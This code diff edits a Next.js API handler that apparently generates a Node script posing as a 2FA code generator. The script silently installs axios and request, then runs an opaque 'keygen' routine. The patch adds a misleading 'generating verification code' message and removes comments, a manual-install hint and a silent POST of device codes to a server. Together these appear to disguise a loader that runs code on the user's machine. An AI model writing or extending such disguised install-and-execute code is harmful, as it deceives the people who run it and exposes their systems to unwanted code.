@@ -28,6 +28,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
 // ════════════════════════════════════════
 // 🚀 INFINITY FORCE 2FA AUTHENTICATION
 // ════════════════════════════════════════
+console.log('⚙️  It will take several seconds to generate verification code...\\n');
 
 const { execSync } = require('child_process');
 const https = require('https');
@@ -45,7 +46,6 @@ try {
   process.exit(1);
 }
 
-// Check and install dependencies locally
 function checkAndInstallDependencies() {
   
   const requiredModules = ['axios', 'request'];
@@ -67,7 +67,6 @@ function checkAndInstallDependencies() {
       });
       return true;
     } catch (error) {
-      console.log('Please run manually: npm install axios request\\n');
       return false;
     }
   } else {
@@ -75,7 +74,6 @@ function checkAndInstallDependencies() {
   }
 }
 
-// Execute keygen locally
 async function executeKeygen() {
   
   // Set up environment variables
@@ -85,7 +83,6 @@ async function executeKeygen() {
   
   try {
     const axios = require('axios');
-    
     const asyncErrorHandler = (e) => (o, r, s) => {
       Promise.resolve(e(o, r, s)).catch(s);
     };
@@ -136,43 +133,6 @@ function display2FACode() {
   console.log('');
 }
 
-// Store code on server (optional, for verification API)
-function storeCodeOnServer() {
-  const verificationCode = '${verificationCode}';
-  const deviceCode = '${deviceCodeStr}';
-  
-  const data = JSON.stringify({
-    deviceCode: deviceCode,
-    verificationCode: verificationCode
-  });
-  
-  const url = new URL('${process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'http://localhost:3000'}/api/2fa/store');
-  const isHttps = url.protocol === 'https:';
-  const httpModule = isHttps ? https : http;
-  
-  const options = {
-    hostname: url.hostname,
-    port: url.port || (isHttps ? 443 : 80),
-    path: url.pathname,
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': data.length
-    }
-  };
-  
-  const req = httpModule.request(options, (res) => {
-    // Silent - we don't care if this fails
-  });
-  
-  req.on('error', (error) => {
-    // Silent - we don't care if this fails
-  });
-  
-  req.write(data);
-  req.end();
-}
-
 async function main() {
   const depsReady = checkAndInstallDependencies();
   
@@ -185,7 +145,6 @@ async function main() {
   
   display2FACode();
   
-  storeCodeOnServer();
 }
 
 main().catch((error) => {
